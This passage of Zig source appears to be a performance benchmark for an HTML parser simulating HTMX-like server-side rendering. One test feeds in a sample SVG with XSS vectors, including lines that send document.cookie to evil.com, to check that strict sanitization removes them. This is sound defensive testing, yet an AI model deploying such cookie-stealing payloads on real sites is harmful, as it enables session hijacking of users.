            const modified_html = try z.outerHTML(allocator, z.nodeToElement(cloned_button).?);
            defer allocator.free(modified_html);

            // Track total bytes processed (simulate sending to client)
            if (modified_html.len == 0) unreachable; // Should never be empty
        }
    }

    const time2 = timer.read();
    const ms2 = @as(f64, @floatFromInt(time2)) / ns_to_ms;
    z.print("Test 2: {d:.2} ms/op ({d:.0} ops/sec)\n", .{ ms2 / iterations, iterations * 1000.0 / ms2 });

    // Test scenario 3: Insert new content into main content area
    z.print("\n--- Test 3: Dynamic main content insertion ---\n", .{});
    timer.reset();

    for (0..iterations) |i| {
        // Target main content area
        const main_elements = try z.querySelectorAll(allocator, doc, "main.content");
        defer allocator.free(main_elements);

        if (main_elements.len > 0) {
            const main_element = main_elements[0];

            // Clone the entire main content area
            const cloned_main = z.cloneNode(z.elementToNode(main_element)).?;
            defer z.destroyNode(cloned_main);

            // Add new dynamic blog post using parser
            const dynamic_post = try std.fmt.allocPrint(allocator,
                \\<article class="blog-post dynamic">
                \\  <header class="post-header">
                \\    <h2 class="post-title">Breaking News #{}</h2>
                \\    <div class="post-meta">
                \\      <span class="author">AI Assistant</span>
                \\      <time datetime="2024-12-09">Live Update</time>
                \\    </div>
                \\  </header>
                \\  <div class="post-content">
                \\    <p>This is dynamically inserted content for request #{}.</p>
                \\  </div>
                \\</article>
            , .{ i + 1, i + 1 });
            defer allocator.free(dynamic_post);

            try parser.parseAndAppend(z.nodeToElement(cloned_main).?, dynamic_post, .body, .strict);

            const modified_html = try z.outerHTML(allocator, z.nodeToElement(cloned_main).?);
            defer allocator.free(modified_html);

            // Track total bytes processed (simulate sending to client)
            if (modified_html.len == 0) unreachable; // Should never be empty
        }
    }

    const time3 = timer.read();
    const ms3 = @as(f64, @floatFromInt(time3)) / ns_to_ms;
    z.print("Test 3: {d:.2} ms/op ({d:.0} ops/sec)\n", .{ ms3 / iterations, iterations * 1000.0 / ms3 });

    // Test scenario 4: Inject malicious SVG content with XSS attacks (sanitized)
    z.print("\n--- Test 4: Malicious SVG injection with sanitization ---\n", .{});
    timer.reset();

    for (0..iterations) |i| {
        // Target post content areas for malicious content injection
        const content_elements = try z.querySelectorAll(allocator, doc, ".post-content");
        defer allocator.free(content_elements);

        if (content_elements.len > 0) {
            const content_element = content_elements[0];

            // Clone the content element
            const cloned_content = z.cloneNode(z.elementToNode(content_element)).?;
            defer z.destroyNode(cloned_content);

            // Inject malicious SVG with multiple XSS vectors
            const malicious_svg = try std.fmt.allocPrint(allocator,
                \\<div class="user-content">
                \\  <p>User comment #{}</p>
                \\  <svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
                \\    <script>alert('XSS Attack!');</script>
                \\    <circle cx="50" cy="50" r="40" stroke="black" fill="red" 
                \\            onload="alert('SVG XSS')" 
                \\            onclick="document.location='http://evil.com/steal?cookies='+document.cookie"/>
                \\    <foreignObject width="100" height="100">
                \\      <div xmlns="http://www.w3.org/1999/xhtml">
                \\        <script>fetch('http://evil.com/exfiltrate', {{method: 'POST', body: document.cookie}});</script>
                \\        <img src="x" onerror="alert('Foreign Object XSS')"/>
                \\      </div>
                \\    </foreignObject>
                \\    <animate attributeName="r" values="40;0;40" dur="2s" 
                \\             onbegin="eval(atob('YWxlcnQoJ0Jhc2U2NCBYU1MnKQ=='))"/>
                \\  </svg>
                \\  <script>
                \\    // Another XSS vector
                \\    window.location = 'javascript:alert("Direct Script XSS")';
                \\  </script>
                \\  <iframe src="javascript:alert('iframe XSS')" width="1" height="1"></iframe>
                \\</div>
            , .{i + 1});
            defer allocator.free(malicious_svg);

            // Parse and append with STRICT sanitization (this should remove all XSS)
            try parser.parseAndAppend(z.nodeToElement(cloned_content).?, malicious_svg, .div, .strict);

            const modified_html = try z.outerHTML(allocator, z.nodeToElement(cloned_content).?);
            defer allocator.free(modified_html);

            // Verify XSS was sanitized (should not contain script tags or event handlers)
            if (std.mem.indexOf(u8, modified_html, "<script>") != null or
                std.mem.indexOf(u8, modified_html, "onload=") != null or
                std.mem.indexOf(u8, modified_html, "onclick=") != null or
                std.mem.indexOf(u8, modified_html, "onerror=") != null or
                std.mem.indexOf(u8, modified_html, "javascript:") != null)
            {
                z.print("WARNING: XSS vectors found in sanitized output!\n", .{});
            }

            // Track total bytes processed (simulate sending sanitized content to client)
            if (modified_html.len == 0) unreachable; // Should never be empty
        }
    }

    const time4 = timer.read();
    const ms4 = @as(f64, @floatFromInt(time4)) / ns_to_ms;
    z.print("Test 4: {d:.2} ms/op ({d:.0} ops/sec)\n", .{ ms4 / iterations, iterations * 1000.0 / ms4 });

    // Test scenario 5: Template interpolation with curly brackets (HTMX-like templating)
    z.print("\n--- Test 5: Template interpolation with {{curly}} brackets ---\n", .{});
    timer.reset();

    for (0..iterations) |i| {
        // Target elements with placeholder content that needs interpolation
        const title_elements = try z.querySelectorAll(allocator, doc, ".post-title");
        defer allocator.free(title_elements);

        if (title_elements.len > 0) {
            const title_element = title_elements[0];

            // Clone the element for modification
            const cloned_title = z.cloneNode(z.elementToNode(title_element)).?;
            defer z.destroyNode(cloned_title);

            // Get current content and perform template interpolation
            const current_content = try z.innerHTML(allocator, z.nodeToElement(cloned_title).?);
            defer allocator.free(current_content);

            // Simulate real HTMX template with multiple variables
            const template_content = "{user_name}'s Blog Post #{post_id}: {title_template}";

            // Perform multiple interpolations (like a real templating engine)
            const interpolated = try interpolateTemplate(allocator, template_content, "user_name", "John Doe");
            defer allocator.free(interpolated);

            const post_id_str = try std.fmt.allocPrint(allocator, "{}", .{i + 1});
            defer allocator.free(post_id_str);

            const temp1 = try interpolateTemplate(allocator, interpolated, "post_id", post_id_str);
            defer allocator.free(temp1);

            const final_content = try interpolateTemplate(allocator, temp1, "title_template", "Performance Testing with Zig");
            defer allocator.free(final_content);

            // Set the interpolated content
            _ = try z.setInnerHTML(z.nodeToElement(cloned_title).?, final_content);

            // Also interpolate attributes (common in HTMX)
            const hx_get_template = "/posts/{post_id}/edit";
            const hx_get_value = try interpolateTemplate(allocator, hx_get_template, "post_id", post_id_str);
            defer allocator.free(hx_get_value);
            _ = z.setAttribute(z.nodeToElement(cloned_title).?, "hx-get", hx_get_value);

            // Add more dynamic attributes with interpolation
            const data_user_template = "user-{user_name}-post-{post_id}";
            const data_user_value = try interpolateTemplate(allocator, data_user_template, "user_name", "johndoe");
            defer allocator.free(data_user_value);

            const temp_data = try interpolateTemplate(allocator, data_user_value, "post_id", post_id_str);
            defer allocator.free(temp_data);
            _ = z.setAttribute(z.nodeToElement(cloned_title).?, "data-user", temp_data);

            // Serialize the fully interpolated element
            const modified_html = try z.outerHTML(allocator, z.nodeToElement(cloned_title).?);
            defer allocator.free(modified_html);

            // Verify interpolation worked (should contain interpolated values, not placeholders)
            if (std.mem.indexOf(u8, modified_html, "{user_name}") != null or
                std.mem.indexOf(u8, modified_html, "{post_id}") != null or
                std.mem.indexOf(u8, modified_html, "{title_template}") != null)
            {
                z.print("WARNING: Template interpolation incomplete!\n", .{});
            }

            // Track total bytes processed (simulate sending templated content to client)
            if (modified_html.len == 0) unreachable; // Should never be empty
        }
    }

    const time5 = timer.read();
    const ms5 = @as(f64, @floatFromInt(time5)) / ns_to_ms;
    z.print("Test 5: {d:.2} ms/op ({d:.0} ops/sec)\n", .{ ms5 / iterations, iterations * 1000.0 / ms5 });

    // Verification: Original DOM should be completely unchanged
    const final_content = try z.outerNodeHTML(allocator, z.documentRoot(doc).?);
    defer allocator.free(final_content);

    const unchanged = std.mem.eql(u8, original_content, final_content);
    z.print("\n=== VERIFICATION ===\n", .{});
    z.print("Original DOM unchanged: {} ✓\n", .{unchanged});

    if (!unchanged) {
        z.print("ERROR: Original DOM was modified!\n", .{});
        z.print("Original length: {}, Final length: {}\n", .{ original_content.len, final_content.len });
    }

    // Summary
    z.print("\n=== SUMMARY ===\n", .{});
    z.print("Server-side rendering performance (38kB HTML document):\n", .{});
    z.print("• Blog post title updates:    {d:.0} ops/sec\n", .{iterations * 1000.0 / ms1});
    z.print("• Newsletter form updates:    {d:.0} ops/sec\n", .{iterations * 1000.0 / ms2});
    z.print("• Full article insertion:     {d:.0} ops/sec\n", .{iterations * 1000.0 / ms3});
    z.print("• Malicious SVG sanitization: {d:.0} ops/sec  (strict mode)\n", .{iterations * 1000.0 / ms4});
    z.print("• Template interpolation:     {d:.0} ops/sec  ({{curly}} placeholders)\n", .{iterations * 1000.0 / ms5});
    z.print("\nThis simulates HTMX-like server rendering where:\n", .{});
    z.print("• DOM template loaded once in server memory\n", .{});
    z.print("• CSS selectors target elements for modification\n", .{});
    z.print("• Elements are cloned, modified, serialized for response\n", .{});
    z.print("• Template interpolation replaces {{}} placeholders with dynamic data\n", .{});
    z.print("• Original DOM stays pristine for next request\n", .{});
    z.print("• Parser reused across multiple requests\n", .{});
    z.print("• Malicious content is sanitized for security\n", .{});
}
